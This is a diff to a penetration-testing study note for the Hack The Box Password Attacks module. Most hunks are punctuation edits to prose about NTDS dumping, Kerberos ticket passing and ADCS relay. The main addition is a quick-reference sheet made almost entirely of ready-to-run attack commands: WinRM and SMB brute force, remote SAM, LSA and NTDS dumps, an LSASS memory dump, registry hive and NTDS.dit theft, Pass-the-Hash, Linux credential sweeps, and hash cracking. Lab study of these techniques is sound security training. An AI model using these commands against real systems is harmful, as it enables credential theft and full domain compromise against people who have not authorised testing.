@@ -2,9 +2,9 @@
 
 #PasswordAttacks #JohnTheRipper #Hashcat #BitLocker #officetojohn #bitlockertojohn #MaskAttack #CustomWordlist #SAMDump #LSASSDump #pypykatz #CredentialManager #cmdkey #LaZagne #findstr #NTDS #VSS #usernameAnarchy #kerbrute #FirefoxDecrypt #Wireshark #Snaffler #PassTheHash #xfreerdp #InvokeTheHash #PassTheTicket #ccache #keytab #kinit #PassTheCertificate #pywhisker #PKINITtools #ADCS #NTLMRelay #HTBSupplementary
 
-**HTB Password Attacks module** — supplementary to Offsec Module 16. The Offsec module covers Hydra (SSH/RDP/HTTP), Hashcat (dictionary + rules), John basics (ssh2john/keepass2john), NTLM cracking (SAM + Mimikatz), Pass-the-Hash (impacket), Net-NTLMv2 (Responder + relay), and Credential Guard. Everything in this note is not covered there.
+**HTB Password Attacks module**, supplementary to Offsec Module 16. The Offsec module covers Hydra (SSH/RDP/HTTP), Hashcat (dictionary + rules), John basics (ssh2john/keepass2john), NTLM cracking (SAM + Mimikatz), Pass-the-Hash (impacket), Net-NTLMv2 (Responder + relay), and Credential Guard. Everything in this note is not covered there.
 
-> 🔁 Cross-refs: [[Password Attacks]] (Module 16 — Hydra, Hashcat, Mimikatz, Responder, relay), [[Using the Metasploit Framework (HTB Supplementary)#MSF.4. Post-Exploitation: NTLM Hash Dumping|MSF.4 post/windows/gather/hashdump]], [[Port Redirection and SSH Tunneling]] (ligolo-ng pivot concepts), [[Footprinting (HTB Supplementary)#FP.1|FP.1 FTP, FP.2 SMB]] (credential context), [[Active Directory Introduction and Enumeration]] (domain attacks context)
+> 🔁 Cross-refs: [[Password Attacks]] (Module 16. Hydra, Hashcat, Mimikatz, Responder, relay), [[Using the Metasploit Framework (HTB Supplementary)#MSF.4. Post-Exploitation: NTLM Hash Dumping|MSF.4 post/windows/gather/hashdump]], [[Port Redirection and SSH Tunneling]] (ligolo-ng pivot concepts), [[Footprinting (HTB Supplementary)#FP.1|FP.1 FTP, FP.2 SMB]] (credential context), [[Active Directory Introduction and Enumeration]] (domain attacks context)
 
 ---
 
@@ -22,7 +22,7 @@ echo -n "string" | md5sum
 echo -n "string" | sha256sum
 ```
 
-The `-n` flag to `echo` is critical — without it a newline is appended and the hash changes.
+The `-n` flag to `echo` is critical, without it a newline is appended and the hash changes.
 
 #### Tags: #sha1sum #md5sum #HashComputation
 
@@ -323,7 +323,7 @@ creds search fortinet
 
 Use these as candidates before brute-forcing. `superdba:admin` is a genuine MySQL default that works on unmodified installs.
 
-> 🔁 Similar to: [[Footprinting (HTB Supplementary)#FP.10. IPMI|FP.10 IPMI]] vendor default creds table. Same principle — check known defaults before brute force.
+> 🔁 Similar to: [[Footprinting (HTB Supplementary)#FP.10. IPMI|FP.10 IPMI]] vendor default creds table. Same principle, check known defaults before brute force.
 
 #### Tags: #DefaultCredentials #defaultcreds-cheat-sheet #mysql #CredentialHunting
 
@@ -430,7 +430,7 @@ nxc smb DC_IP -u stom -H NTLM_HASH --ntds --user Administrator
 nxc smb TARGET_IP --local-auth -u admin -p pass --sam
 ```
 
-> 🔍 Worth remembering generally: `--ntds` on a DC is equivalent to `impacket-secretsdump -just-dc`. The `--user Administrator` filter saves time by only dumping that one account's hash — useful when you just need the DA hash.
+> 🔍 Worth remembering generally: `--ntds` on a DC is equivalent to `impacket-secretsdump -just-dc`. The `--user Administrator` filter saves time by only dumping that one account's hash, useful when you just need the DA hash.
 
 > 🔁 Similar to: [[Password Attacks#16.3.3. Cracking Net-NTLMv2|16.3.3 + 16.3.4]] uses Responder + ntlmrelayx. NetExec `--lsa`/`--ntds` requires credentials but gives cleartext secrets and all hashes without relying on capturing NTLM challenges.
 
@@ -569,7 +569,7 @@ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
 hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt.gz
 ```
 
-> 🔍 Worth remembering generally: the `krbtgt` hash from the NTDS dump is what you need for a Golden Ticket attack (offline Kerberos TGT forgery). The `krbtgt` hash doesn't change unless someone runs `Reset-KrbtgtPassword` — so if you get it, it can persist as a backdoor. This is an AD-specific technique but important context for why NTDS dumps are so valuable.
+> 🔍 Worth remembering generally: the `krbtgt` hash from the NTDS dump is what you need for a Golden Ticket attack (offline Kerberos TGT forgery). The `krbtgt` hash doesn't change unless someone runs `Reset-KrbtgtPassword`, so if you get it, it can persist as a backdoor. This is an AD-specific technique but important context for why NTDS dumps are so valuable.
 
 > 🔁 Similar to: [[Password Attacks#16.3.1. Cracking NTLM|16.3.1]] covers SAM dump (local accounts). VSS + NTDS covers all domain accounts on the DC.
 
@@ -601,7 +601,7 @@ Use the output as `-L usernames.txt` with kerbrute or Hydra.
 
 ## PA.14. kerbrute — Kerberos Username Enumeration + Password Spray
 
-kerbrute tests usernames and passwords against a Kerberos KDC without requiring SMB or LDAP. Kerberos errors (KDC_ERR_C_PRINCIPAL_UNKNOWN vs KDC_ERR_PREAUTH_REQUIRED) distinguish valid from invalid usernames — no authentication needed.
+kerbrute tests usernames and passwords against a Kerberos KDC without requiring SMB or LDAP. Kerberos errors (KDC_ERR_C_PRINCIPAL_UNKNOWN vs KDC_ERR_PREAUTH_REQUIRED) distinguish valid from invalid usernames, no authentication needed.
 
 ```bash
 # Download (or use: apt install kerbrute)
@@ -621,7 +621,7 @@ netexec smb DC_IP
 # → [+] VALID LOGIN: jmarston@ILF.local:P@ssword!
 ```
 
-> 🔧 Technique: kerbrute's `userenum` does NOT generate authentication events in the Windows Security Event Log for invalid usernames — it's stealthier than LDAP-based enumeration. Valid usernames do generate a pre-auth request (event 4768) but failed usernames generate no log at all. This makes it useful for username discovery without triggering alerts.
+> 🔧 Technique: kerbrute's `userenum` does NOT generate authentication events in the Windows Security Event Log for invalid usernames, it's stealthier than LDAP-based enumeration. Valid usernames do generate a pre-auth request (event 4768) but failed usernames generate no log at all. This makes it useful for username discovery without triggering alerts.
 
 > 🔧 Technique: `fasttrack.txt` is a short (250-entry) wordlist of commonly used corporate passwords (`P@ssword!`, `Password123`, `Welcome1`, `Summer2020`...). It's much faster than rockyou.txt for targeted AD user brute force where lockout policies might apply.
 
@@ -848,8 +848,8 @@ dir *.kirbi
 ```
 
 **Ticket filename anatomy:** `[LUID]-Group-N-Flags-Username@ServiceClass-REALM.kirbi`
-- Group 2 = Ticket Granting Ticket (TGT) — this is what you want
-- Group 0/1 = Ticket Granting Service tickets (TGS) — service-specific
+- Group 2 = Ticket Granting Ticket (TGT), this is what you want
+- Group 0/1 = Ticket Granting Service tickets (TGS), service-specific
 
 ### PA.19.2. Pass the Ticket (import a TGT)
 
@@ -887,7 +887,7 @@ Enter-PSSession -ComputerName DC01
 
 > 🔍 Worth remembering generally: `kerberos::ptt` loads the ticket into the current process's Kerberos credential cache. Any child process (including `powershell` spawned from that cmd) inherits the ticket. `Enter-PSSession` then uses Kerberos authentication automatically when a valid TGT is cached.
 
-> 🔁 Similar to: [[Password Attacks#16.3.2. Passing NTLM|16.3.2 PtH]] uses NTLM hashes for lateral movement. PtT uses Kerberos tickets instead — same goal, different protocol. Kerberos PtT is required when NTLMv1/v2 is disabled on the network.
+> 🔁 Similar to: [[Password Attacks#16.3.2. Passing NTLM|16.3.2 PtH]] uses NTLM hashes for lateral movement. PtT uses Kerberos tickets instead, same goal, different protocol. Kerberos PtT is required when NTLMv1/v2 is disabled on the network.
 
 #### Tags: #PassTheTicket #PtT #Kerberos #TGT #kirbi #mimikatz #sekurlsatickets #kerberosPtt #PSRemoting
 
@@ -1082,11 +1082,11 @@ impacket-secretsdump -k -no-pass -dc-ip DC_IP \
 evil-winrm -i dc01.domain.local -u Administrator -H fd02e525dd676fd8ca04e200d265f20c
 ```
 
-> 🔍 Worth remembering generally: the ADCS relay attack (ESC8) requires: (1) an ADCS server with Web Enrollment enabled, (2) the ability to coerce NTLM authentication from a DC (via PrinterBug, PetitPotam, or similar), and (3) an unprotected ADCS enrollment endpoint (no EPA/Extended Protection). This is an extremely high-value attack on AD environments — machine account + DCSync = full domain compromise in one chain.
+> 🔍 Worth remembering generally: the ADCS relay attack (ESC8) requires: (1) an ADCS server with Web Enrollment enabled, (2) the ability to coerce NTLM authentication from a DC (via PrinterBug, PetitPotam, or similar), and (3) an unprotected ADCS enrollment endpoint (no EPA/Extended Protection). This is an extremely high-value attack on AD environments, machine account + DCSync = full domain compromise in one chain.
 
-> 🔧 Technique: the `oscrypto` libcrypto fix (`pip3 install -I git+https://github.com/wbond/oscrypto.git`) is almost always needed when running `gettgtpkinit.py`. Save this command in your notes — the "Error detecting the version of libcrypto" error is a guaranteed stumbling block.
+> 🔧 Technique: the `oscrypto` libcrypto fix (`pip3 install -I git+https://github.com/wbond/oscrypto.git`) is almost always needed when running `gettgtpkinit.py`. Save this command in your notes, the "Error detecting the version of libcrypto" error is a guaranteed stumbling block.
 
-> 🔁 Similar to: [[Password Attacks#16.3.4. Relaying Net-NTLMv2|16.3.4 NTLM relay]] relays NTLM to SMB for command execution. This relays NTLM to ADCS HTTP for certificate issuance — same relay infrastructure, different target service.
+> 🔁 Similar to: [[Password Attacks#16.3.4. Relaying Net-NTLMv2|16.3.4 NTLM relay]] relays NTLM to SMB for command execution. This relays NTLM to ADCS HTTP for certificate issuance, same relay infrastructure, different target service.
 
 #### Tags: #PassTheCertificate #ShadowCredentials #pywhisker #PKINITtools #PKINIT #ADCS #ESC8 #ntlmrelayx #printerbug #DCSync #machineAccount
 
@@ -1230,7 +1230,7 @@ After autoroute, all internal IPs (172.16.119.x) are routable from Kali.
 - [x] PA.21 Pass the Certificate (pywhisker, gettgtpkinit.py, ADCS relay/ESC8, printerbug, DCSync)
 - [x] PA.22 Skills assessment chain + ligolo-ng pivot
 - [x] PA.23 All 53 Q&A answers
-- All labs are HTB spawnable targets — no Offsec VM required for this note
+- All labs are HTB spawnable targets, no Offsec VM required for this note
 
 ---
 
@@ -1241,3 +1241,135 @@ After autoroute, all internal IPs (172.16.119.x) are routable from Kali.
 - **[Active](https://0xdf.gitlab.io/2018/12/08/htb-active.html)** (HTB, Windows, Easy): GPP password → Kerberoasting → DA. Kerberos ticket abuse, PA.19 territory.
 - **[Cascade](https://www.hackthebox.com/machines/cascade)** (HTB, Windows, Medium): Active Directory credential hunting, LDAP, Kerberos. Heavy credential chaining like PA.10-PA.12.
 - **[Bastion](https://www.hackthebox.com/machines/bastion)** (HTB, Windows, Easy): VHD mount → SAM offline extraction → user credentials. Direct parallel to PA.4 and PA.7.
+
+
+---
+
+## HTB Module Quick Reference
+
+Commands formatted for use with the [[Pre-Engagement Kali Setup]] variable block.
+
+```bash
+# ============================================================
+# WORDLIST GENERATION
+# ============================================================
+# CeWL — crawl a site and build a keyword wordlist
+cewl https://$BoxName -d 4 -m 6 --lowercase -w loot/cewl.wordlist
+
+# Hashcat rule-based mutation (generates mutated variants)
+hashcat --force loot/cewl.wordlist -r /usr/share/hashcat/rules/best64.rule \
+  --stdout > loot/mutated.wordlist
+
+# username-anarchy — generate usernames from real names
+./username-anarchy -i /path/to/firstlast.txt
+
+# ============================================================
+# REMOTE ATTACKS (with Netexec / Hydra)
+# ============================================================
+# WinRM brute-force
+netexec winrm $BoxIP -u users.txt -p passwords.txt
+
+# SMB share enumeration (credentialed)
+netexec smb $BoxIP -u $Username -p $Password --shares
+
+# SMB password spray
+hydra -L users.txt -P passwords.txt smb://$BoxIP
+
+# SAM dump via network (local admin required)
+netexec smb $BoxIP --local-auth -u $Username -p $Password --sam
+
+# LSA secrets dump (may yield cleartext for services/scheduled tasks)
+netexec smb $BoxIP --local-auth -u $Username -p $Password --lsa
+
+# NTDS dump (domain admin required)
+netexec smb $DCip -u $Username -p $Password --ntds
+
+# PtH via evil-winrm
+evil-winrm -i $BoxIP -u $Username -H $NThash
+
+# ============================================================
+# WINDOWS LOCAL ATTACKS
+# ============================================================
+# LSASS memory dump via rundll32 (admin shell required)
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+
+# Parse LSASS dump on Kali
+pypykatz lsa minidump loot/lsass.dmp
+
+# Offline SAM dump (copy hives → secretsdump LOCAL)
+reg.exe save hklm\sam C:\sam.save
+reg.exe save hklm\security C:\security.save
+reg.exe save hklm\system C:\system.save
+# Exfil via SMB share, then:
+impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
+
+# NTDS via VSS shadow copy
+vssadmin CREATE SHADOW /For=C:
+cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
+impacket-secretsdump -ntds C:\NTDS\NTDS.dit -system C:\NTDS\SYSTEM LOCAL
+
+# Credential Manager
+cmdkey /list                              # list saved Windows credentials
+runas /savecred /user:$Username cmd       # reuse a saved credential
+
+# Snaffler — find credentials on network shares
+snaffler.exe -s
+
+# ============================================================
+# LINUX LOCAL ATTACKS
+# ============================================================
+# Config file sweep
+for l in .conf .config .cnf; do
+  find / -name "*$l" 2>/dev/null | grep -v "lib\|fonts\|share\|core"
+done
+
+# Private key hunt
+grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
+
+# Bash history of all users
+tail -n5 /home/*/.bash*
+
+# Mimipenguin (dumps from memory — requires root)
+python3 mimipenguin.py
+
+# LaZagne — all credential sources
+python2.7 lazagne.py all
+
+# Firefox saved credentials
+python3.9 firefox_decrypt.py
+
+# ============================================================
+# HASH CRACKING
+# ============================================================
+# NTLM hashes (from SAM/secretsdump)
+hashcat -m 1000 loot/ntlm.hashes /usr/share/wordlists/rockyou.txt
+
+# NTLMv2 hashes (from Responder/Inveigh)
+hashcat -m 5600 loot/ntlmv2.hashes /usr/share/wordlists/rockyou.txt
+
+# SHA512crypt (Linux /etc/shadow)
+unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
+hashcat -m 1800 -a 0 /tmp/unshadowed.hashes /usr/share/wordlists/rockyou.txt
+
+# BitLocker hash
+bitlocker2john -i Backup.vhd > loot/bitlocker.hashes
+hashcat -m 22100 loot/bitlocker.hashes /usr/share/wordlists/rockyou.txt
+
+# SSH private key passphrase
+python3 ssh2john.py SSH.private > loot/ssh.hash
+john loot/ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+# Office document password
+office2john.py Protected.docx > loot/docx.hash
+john loot/docx.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+# ZIP password
+zip2john archive.zip > loot/zip.hash
+john loot/zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+# Kerberoast TGS tickets
+hashcat -m 13100 loot/kerberoast.hashes /usr/share/wordlists/rockyou.txt
+
+# AS-REP roast hashes
+hashcat -m 18200 loot/asrep.hashes /usr/share/wordlists/rockyou.txt
+```
